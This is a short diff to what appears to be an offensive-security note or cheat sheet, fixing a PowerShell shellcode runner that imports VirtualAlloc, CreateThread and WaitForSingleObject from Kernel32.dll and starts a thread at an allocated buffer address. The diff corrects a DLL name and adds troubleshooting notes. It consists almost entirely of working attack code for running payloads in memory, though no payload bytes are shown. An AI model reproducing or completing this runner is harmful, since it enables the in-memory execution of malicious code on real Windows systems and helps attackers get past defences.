@@ -30,7 +30,7 @@ public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint 
 [DllImport("Kernel32.dll")]
 public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
-[DllImport("coredll.dll", SetLastError = true)]
+[DllImport("Kernel32.dll", SetLastError = true)]
 public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 }
 "@
@@ -44,3 +44,7 @@ $size = $buf.length
 $thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
 [Shell32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
 ```
+
+Note:
+* Can remove all the `[return: MarshalAs(...)]`
+* Sometimes the DLL might not be correct, refer back to MSDN for the final confirmation
